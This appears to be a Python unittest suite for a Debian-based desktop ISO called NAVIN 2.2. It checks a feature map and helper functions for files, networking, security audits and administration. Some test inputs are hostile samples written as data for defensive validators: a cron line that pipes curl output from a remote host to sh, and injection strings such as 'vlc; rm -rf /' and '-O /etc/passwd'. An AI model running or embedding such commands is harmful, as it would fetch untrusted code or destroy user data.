"""NAVIN 2.2: every feature of the 1,100-feature request maps to a real part of the ISO, and the new
Toolbox logic (1001-1100 gaps) behaves correctly."""
import importlib.util
import json
import pathlib
import re
import struct
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
REPO = ROOT.parent
IC = ROOT / 'config/includes.chroot'
spec = importlib.util.spec_from_file_location('navin_tools', IC / 'usr/local/lib/navin/navin_tools.py')
T = importlib.util.module_from_spec(spec); spec.loader.exec_module(T)


def words(path):
    out = set()
    for line in path.read_text().splitlines():
        out.update(line.split('#')[0].split())
    return out


PKGS = words(ROOT / 'config/package-lists/navin-os.list.chroot')
OPTIONAL = words(IC / 'usr/share/navin/optional-packages.list')
CATALOG = {x if isinstance(x, str) else (x.get('id') or x.get('pkg') or x.get('name'))
           for v in json.loads((IC / 'usr/local/lib/navin/catalog.json').read_text()).values() if isinstance(v, list) for x in v}
TOOLBOX = (IC / 'usr/local/bin/navin-toolbox').read_text()
TOOL_IDS = set(re.findall(r'^    \("(\w+)", "', TOOLBOX, re.M))
KEYS = (IC / 'etc/skel/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml').read_text()
FEATURES = json.loads((IC / 'usr/share/navin/features-2.2.json').read_text())
ALL = [r for s in FEATURES['sections'] for r in s['items']] + FEATURES['named']


def check(e):
    k, ref = e['kind'], e.get('ref')
    if k == 'pkg':
        return ref in PKGS or ref in OPTIONAL or ref in ('xfce4-panel', 'xfwm4'), f'package {ref} not in the ISO lists'
    if k == 'store':
        return ref in CATALOG, f'{ref} not in the App Store catalog'
    if k == 'tool':
        return ref in TOOL_IDS, f'Toolbox has no tool {ref}'
    if k == 'key':
        name = ref.replace('<', '&lt;').replace('>', '&gt;')
        return f'name="{name}"' in KEYS, f'shortcut {ref} missing'
    if k == 'file':
        path, _, text = ref.partition('::')
        p = ROOT / 'config/hooks/live' / path[6:] if path.startswith('hooks:') else IC / path
        return p.exists() and text in p.read_text(), f'{p} missing or lacks {text!r}'
    if k in ('partial', 'none'):
        if not e.get('note'):
            return False, 'partial/none needs an honest note'
        return check(e['via']) if 'via' in e else (True, '')
    return False, f'unknown kind {k}'


class FeatureMap(unittest.TestCase):
    def test_every_feature_points_to_something_real(self):
        bad = []
        for e in ALL:
            ok, why = check(e)
            if not ok:
                bad.append(f"{e['n']} {e['name']}: {why}")
        self.assertEqual(bad, [])

    def test_all_100_named_features(self):
        self.assertEqual([e['n'] for e in FEATURES['named']], list(range(1001, 1101)))

    def test_all_14_sections_cover_1_to_1000(self):
        self.assertEqual(len(FEATURES['sections']), 14)
        self.assertEqual(FEATURES['sections'][0]['slots'], '1-100')
        self.assertEqual(FEATURES['sections'][-1]['slots'], '951-1000')

    def test_every_toolbox_tool_has_a_function(self):
        for tid, fn in re.findall(r'^    \("(\w+)", "[^"]+", "[^"]+", "[^"]*", \[.*?\], (\w+)', TOOLBOX, re.M):
            if fn != 't_open':
                self.assertIn(f'def {fn}(', TOOLBOX, tid)

    def test_toolbox_open_targets_exist(self):
        for prog in re.findall(r't_open\("([\w-]+)"', TOOLBOX):
            if prog.startswith('navin-'):
                self.assertTrue((IC / 'usr/local/bin' / prog).exists(), prog)


class WhatsNew22(unittest.TestCase):
    def test_every_listed_change_exists_in_its_file(self):
        data = json.loads((IC / 'usr/share/navin/whatsnew-2.2.json').read_text())
        self.assertEqual(data['version'], '2.2')
        for it in data['items']:
            path = REPO / it['path']
            self.assertTrue(path.exists(), it['path'])
            self.assertIn(it['check'], path.read_text(), it['title'])


class Desktop22(unittest.TestCase):
    XBEL = '''<xbel><bookmark href="file:///home/n/a%20b.pdf" added="x" modified="2026-11-10T10:00:00Z" visited="x">
<info><metadata><bookmark:applications><bookmark:application name="Atril" exec="atril %u" modified="x" count="3"/></bookmark:applications></metadata></info></bookmark>
<bookmark href="file:///home/n/c.txt" added="x" modified="2026-11-12T10:00:00Z" visited="x">
<info><metadata><bookmark:applications><bookmark:application name="Mousepad" exec="m" modified="x" count="5"/>
<bookmark:application name="Atril" exec="a" modified="x" count="1"/></bookmark:applications></metadata></info></bookmark></xbel>'''

    def test_recent_and_suggestions(self):
        r = T.parse_recent(self.XBEL)
        self.assertEqual([p for p, _, _ in r], ['/home/n/c.txt', '/home/n/a b.pdf'])
        self.assertEqual(T.app_suggestions(r), [('Mousepad', 5), ('Atril', 4)])

    def test_tile_layout_fills_screen_without_overlap(self):
        self.assertEqual(T.tile_layout(1, 1366, 700), [(6, 6, 1354, 688)])
        cells = T.tile_layout(3, 1366, 700)
        self.assertEqual(len(cells), 3)
        self.assertEqual(cells[2][2], 1354)  # last window takes the full bottom row
        self.assertEqual(T.tile_layout(0, 100, 100), [])

    def test_workspace_saver_skips_desktop_parts_and_duplicates(self):
        wins = T.parse_wmctrl('0x01 0 100 0 0 10 10 host Files\n0x02 -1 5 0 0 1 1 host xfce4-panel\n0x03 1 200 0 0 1 1 host Doc\n0x04 1 200 0 0 1 1 host Doc2\n')
        argv = {100: ['thunar'], 200: ['mousepad', 'a.txt'], 5: ['xfce4-panel']}
        self.assertEqual(T.session_from_windows(wins, argv.get),
                         [{'desktop': 0, 'argv': ['thunar']}, {'desktop': 1, 'argv': ['mousepad', 'a.txt']}])

    def test_profiles_and_clip_slots(self):
        self.assertTrue(T.profile_name_ok('Work 2'))
        self.assertFalse(T.profile_name_ok('../etc'))
        self.assertTrue(T.clip_slot_path('/c', 9).endswith('slot-9.txt'))
        with self.assertRaises(ValueError):
            T.clip_slot_path('/c', 10)

    def test_voice_text(self):
        self.assertEqual(T.voice_query('{"b":0,"t":"open"}\nnoise\n{"t":"firefox"}\n'), 'open firefox')


class Files22(unittest.TestCase):
    def test_chmod_refuses_world_writable(self):
        self.assertEqual(T.chmod_cmd('/h/f', '644'), ['chmod', '644', '--', '/h/f'])
        for bad in ('777', '666', '9', 'rwx'):
            with self.assertRaises(ValueError):
                T.chmod_cmd('/h/f', bad)
        self.assertTrue(T.mode_text(0o754).startswith('rwxr-xr--'))

    def test_batch_convert_never_overwrites(self):
        plan = T.batch_convert_plan(['a.png', 'a.jpg', 'b.PNG', 'song.mp3'], 'jpg')
        self.assertEqual(plan, [('a.png', 'a (1).jpg'), ('b.PNG', 'b.jpg')])
        with self.assertRaises(ValueError):
            T.batch_convert_plan([], 'exe')

    def test_join_list_quotes(self):
        self.assertEqual(T.video_join_list(['/v/a.mp4', "/v/it's.mp4"]), "file '/v/a.mp4'\nfile '/v/it'\\''s.mp4'\n")

    def test_sync_newer_wins_nothing_deleted(self):
        self.assertEqual(T.sync_plan({'a': 100, 'b': 50, 'c': 10}, {'a': 10, 'b': 50, 'd': 5}), (['a', 'c'], ['d']))

    def test_old_cache(self):
        now = 100 * 86400
        self.assertEqual(T.old_cache_files([('/o', 5, now - 40 * 86400), ('/n', 5, now - 86400)], now), [('/o', 5)])


class History22(unittest.TestCase):
    def test_round_trip_and_drain(self):
        lines = [T.history_line(1000 + i * 300, 80 - i, 'Discharging', 40, 10, 70) for i in range(5)]
        rows = T.parse_history(''.join(lines) + 'garbage\n')
        self.assertEqual(len(rows), 5)
        self.assertEqual(T.summarize_history(rows, 'battery'), {'min': 76.0, 'max': 80.0, 'avg': 78.0, 'samples': 5})
        self.assertEqual(T.battery_drain_per_hour(rows), 12.0)
        self.assertIsNone(T.summarize_history(T.parse_history(T.history_line(1, None, None, None, None, None)), 'wifi'))

    def test_trim(self):
        self.assertEqual(T.trim_history(['10,1\n', '900000,2\n'], 1, 900000), ['900000,2\n'])

    def test_wifi_signal(self):
        txt = 'Inter-| sta-|   Quality\n face | tus | link level noise\n wlan0: 0000   49.  -61.  -256 0 0 0 0 0 0\n'
        self.assertEqual(T.wifi_signal(txt), 70)
        self.assertIsNone(T.wifi_signal(''))


class Hardware22(unittest.TestCase):
    def test_usb_problems(self):
        log = 'usb 1-2: device descriptor read/64, error -71\nusb 1-2: device descriptor read/64, error -71\nusb 1-3: USB disconnect, device number 4\n'
        self.assertEqual(T.usb_problems(log), [('device descriptor read/N, error -N', 2)])

    def test_xrandr(self):
        self.assertEqual(T.parse_xrandr('LVDS1 connected primary 1366x768+0+0 (normal)\nVGA1 disconnected (normal)\n'),
                         [('LVDS1', True, '1366x768', True), ('VGA1', False, None, False)])

    def test_pactl(self):
        self.assertEqual(T.parse_pactl_short('1\talsa_output.pci\tPipeWire\ts16le\tRUNNING\n2\talsa_output.pci.monitor\tx\ty\tIDLE\n'),
                         [('alsa_output.pci', 'RUNNING')])

    def test_lspci_k(self):
        t = '00:02.0 VGA compatible controller: Intel Ironlake\n\tKernel driver in use: i915\n02:00.0 Network controller: Atheros\n\tSubsystem: x\n'
        self.assertEqual(T.parse_lspci_k(t), [('VGA compatible controller: Intel Ironlake', 'i915'), ('Network controller: Atheros', None)])


class Network22(unittest.TestCase):
    def test_subnet_limits(self):
        hosts = T.subnet_hosts('192.168.1.7/24')
        self.assertEqual(len(hosts), 253)
        self.assertNotIn('192.168.1.7', hosts)
        self.assertEqual(T.subnet_hosts('10.5.6.7/8')[0], '10.5.6.1')  # narrowed to 10.5.6.0/24
        self.assertEqual(len(T.subnet_hosts('10.5.6.7/8')), 253)
        with self.assertRaises(ValueError):
            T.subnet_hosts('fe80::1/64')

    def test_neigh(self):
        t = '192.168.1.1 dev wlan0 lladdr aa:bb:cc:dd:ee:ff REACHABLE\n192.168.1.9 dev wlan0 FAILED\n'
        self.assertEqual(T.parse_neigh(t), [('192.168.1.1', 'aa:bb:cc:dd:ee:ff')])

    def test_download_resumes_and_rejects_bad_links(self):
        self.assertIn('-c', T.download_cmd('https://x.org/a.iso', '/d'))
        for bad in ('ftp://x', 'x.org', '-O /etc/passwd'):
            with self.assertRaises(ValueError):
                T.download_cmd(bad, '/d')

    def test_priority_and_reconnect(self):
        self.assertEqual(T.priority_cmd('Home', '10')[-1], '10')
        self.assertEqual(T.reconnect_cmd('Home')[-1], '0')
        with self.assertRaises(ValueError):
            T.priority_cmd('Home', '5000')

    def test_captive_and_speed(self):
        self.assertFalse(T.captive_portal('NetworkManager is online\n'))
        self.assertTrue(T.captive_portal('<html>Hotel Wi-Fi login</html>'))
        self.assertEqual(T.mbit_per_s(25_000_000, 10), 20.0)


class Security22(unittest.TestCase):
    def test_usb_risks(self):
        found = dict(T.usb_risks(['autorun.inf', 'photo.jpg.exe', '.hidden.vbs', 'Holiday.lnk', 'Docs/report.pdf', 'setup.exe']))
        self.assertEqual(set(found), {'autorun.inf', 'photo.jpg.exe', '.hidden.vbs', 'Holiday.lnk'})

    def test_failed_logins(self):
        j = ('2026-11-12T10:00:01+0530 pc lightdm[1]: pam_unix(lightdm:auth): authentication failure; logname= uid=0 euid=0 tty=:0 ruser= rhost=  user=navin\n'
             '2026-11-12T10:01:00+0530 pc sudo[2]: pam_unix(sudo:session): session opened for user root\n')
        self.assertEqual(T.failed_logins(j), [('2026-11-12T10:00:01+0530', 'navin')])

    def test_dpkg_verify_ignores_config_files(self):
        t = '??5??????   /usr/bin/ls\n??5?????? c /etc/hosts\nmissing     /usr/share/doc/x\n'
        self.assertEqual(T.parse_dpkg_verify(t), [('/usr/bin/ls', 'content changed'), ('/usr/share/doc/x', 'missing')])

    def test_permission_history(self):
        a = T.perm_snapshot([('/h/.ssh', 0o40700, 1000)])
        b = T.perm_snapshot([('/h/.ssh', 0o40755, 1000), ('/h/x', 0o100644, 1000)])
        self.assertEqual(T.perm_diff(a, b), [('/h/.ssh', '0o700:1000', '0o755:1000'), ('/h/x', '(new)', '0o644:1000')])

    def test_startup_risks(self):
        e = [('a', 'ok', '/usr/bin/xfce4-panel'), ('a', 'tmp', '/tmp/x/run'), ('a', 'hid', '/home/n/.cache/m/bot'),
             ('a', 'dl', '/home/n/Downloads/x'), ('cron', 'line', '* * * * * curl http://e | sh'), ('a', 'navin', '/usr/local/bin/navin-pill'),
             ('a', 'unknown', '/opt/weird/bin')]
        owned = lambda p: p.startswith('/usr/bin/')
        self.assertEqual([n for _, n, _ in T.startup_risks(e, owned)], ['tmp', 'hid', 'dl', 'line', 'unknown'])

    def test_ufw_blocks(self):
        t = '[UFW BLOCK] IN=wlan0 SRC=1.2.3.4 DST=x PROTO=TCP SPT=1 DPT=22\n' * 3 + '[UFW BLOCK] SRC=5.6.7.8 PROTO=UDP\n'
        self.assertEqual(T.parse_ufw_blocks(t), [(('1.2.3.4', 'TCP', '22'), 3), (('5.6.7.8', 'UDP', '-'), 1)])

    def test_audit_score(self):
        score, lines = T.audit_score({'firewall': True, 'lock': True, 'nopass': None})
        self.assertEqual(score, 35)
        self.assertEqual(len(lines), 7)

    def test_listening_ignores_localhost(self):
        t = 'tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*\ntcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\nudp UNCONN 0 0 [::1]:323 [::]:*\n'
        self.assertEqual(T.parse_listening(t), [('tcp', '0.0.0.0', '22')])

    def test_parental_block_and_unblock(self):
        h = T.hosts_block('127.0.0.1 localhost\n', ['youtube.com', 'https://www.facebook.com/x'])
        self.assertIn('0.0.0.0 www.youtube.com', h)
        self.assertEqual(T.blocked_sites(h), ['youtube.com', 'facebook.com'])
        self.assertEqual(T.hosts_block(h, []), '127.0.0.1 localhost\n')
        with self.assertRaises(ValueError):
            T.hosts_block('', ['bad site; rm'])

    def test_guest_and_lock(self):
        self.assertEqual(T.guest_cmds('create')[0][:2], ['pkexec', 'useradd'])
        self.assertEqual(T.lock_delay_cmds(10)[0], ['xset', 's', '600', '600'])
        with self.assertRaises(ValueError):
            T.lock_delay_cmds(0)


class Performance22(unittest.TestCase):
    def test_background_ranking(self):
        procs = [{'pid': 1, 'name': 'a', 'uid': 1000, 'rss': 10, 'cpu_time': 1, 'has_window': False},
                 {'pid': 2, 'name': 'b', 'uid': 1000, 'rss': 50, 'cpu_time': 1, 'has_window': True},
                 {'pid': 3, 'name': 'c', 'uid': 0, 'rss': 90, 'cpu_time': 1, 'has_window': False},
                 {'pid': 4, 'name': 'd', 'uid': 1000, 'rss': 30, 'cpu_time': 1, 'has_window': False}]
        self.assertEqual([p['pid'] for p in T.rank_processes(procs, 1000)], [4, 1])

    def test_renice_needs_password_only_for_higher_priority(self):
        self.assertEqual(T.renice_cmd(1234, 'low'), ['renice', '-n', '10', '-p', '1234'])
        self.assertEqual(T.renice_cmd(1234, 'high')[0], 'pkexec')
        with self.assertRaises(ValueError):
            T.renice_cmd(1, 'low')

    def test_zram_profiles(self):
        self.assertIn('echo lite > /etc/navin/memprofile', T.zram_profile_cmd('lite')[-1])
        with self.assertRaises(ValueError):
            T.zram_profile_cmd('lite; reboot')

    def test_emergency_closes_biggest_until_enough(self):
        procs = [{'pid': 1, 'name': 'firefox', 'rss': 300 << 20}, {'pid': 2, 'name': 'Xorg', 'rss': 900 << 20},
                 {'pid': 3, 'name': 'vlc', 'rss': 200 << 20}]
        self.assertEqual([p['pid'] for p in T.emergency_targets(procs, 50 << 20)], [1, 3])
        self.assertEqual(T.emergency_targets(procs, 1 << 30), [])


class Admin22(unittest.TestCase):
    def test_sources(self):
        t = 'Types: deb\nURIs: http://deb.debian.org/debian\nSuites: trixie\nComponents: main\n\nURIs: x\nEnabled: no\n'
        self.assertEqual([r['URIs'] for r in T.parse_sources(t)], ['http://deb.debian.org/debian', 'x'])

    def test_grub_set_keeps_other_lines(self):
        t = 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX_DEFAULT="quiet splash i8042.nomux=1 i8042.reset=1"\nGRUB_X=1\n'
        new = T.grub_set(t, timeout=2, quiet=False)
        self.assertEqual(new, 'GRUB_TIMEOUT=2\nGRUB_CMDLINE_LINUX_DEFAULT="i8042.nomux=1 i8042.reset=1"\nGRUB_X=1\n')
        self.assertIn('"quiet splash i8042', T.grub_set(new, quiet=True))
        with self.assertRaises(ValueError):
            T.grub_set(t, timeout=99)

    def test_pkg_name(self):
        self.assertTrue(T.pkg_name_ok('libreoffice-writer'))
        self.assertFalse(T.pkg_name_ok('vlc; rm -rf /'))

    def test_timer_units(self):
        u = T.user_timer_units('backup', "cp -ru '/h/Documents/.' '/m/B'", 'daily', 'NAVIN backup')
        self.assertIn('OnCalendar=daily', u['navin-auto-backup.timer'])
        self.assertIn('Persistent=true', u['navin-auto-backup.timer'])
        for bad in (('x', 'c', 'every 5 sec'), ('Bad Name', 'c', 'daily'), ('x', 'a\nb', 'daily')):
            with self.assertRaises(ValueError):
                T.user_timer_units(*bad, 'd')
        self.assertIn("cp -ru --preserve=timestamps '/h/Documents/.' '/m/B/Documents'", T.backup_command(['/h/Documents'], '/m/B'))


class Navin22(unittest.TestCase):
    @staticmethod
    def pe(machine):
        head = bytearray(512); head[:2] = b'MZ'; struct.pack_into('<I', head, 0x3C, 128)
        head[128:132] = b'PE\x00\x00'; struct.pack_into('<H', head, 132, machine)
        return bytes(head)

    def test_pe_arch(self):
        self.assertEqual(T.pe_arch(self.pe(0x8664)), '64-bit')
        self.assertEqual(T.pe_arch(self.pe(0x14C)), '32-bit')
        self.assertIsNone(T.pe_arch(b'\x7fELF' + bytes(100)))

    def test_compat(self):
        self.assertEqual(T.compat_verdict('game.exe', self.pe(0x14C))[0], 'maybe')
        self.assertEqual(T.compat_verdict('fake.exe', b'hello' * 20)[0], 'no')
        self.assertEqual(T.compat_verdict('a.deb')[0], 'yes')
        self.assertEqual(T.compat_verdict('a.apk')[0], 'no')

    def test_maintenance_plan(self):
        todo = T.maintenance_plan(5 << 30, 100 << 30, ['cups.service'], 600 << 20, 3)
        self.assertEqual([k for k, _ in todo], ['disk', 'services', 'updates', 'cache'])
        self.assertEqual(T.maintenance_plan(50 << 30, 100 << 30, [], 0, 0), [])

    def test_avatar(self):
        cmds = T.avatar_cmds('/p/me.jpg', 'navin', '/tmp/a.png')
        self.assertEqual(cmds[0][0], 'ffmpeg')
        with self.assertRaises(ValueError):
            T.avatar_cmds('/p/me.gif', 'navin', '/tmp/a.png')
        with self.assertRaises(ValueError):
            T.avatar_cmds('/p/me.png', 'root;x', '/tmp/a.png')


if __name__ == '__main__':
    unittest.main()
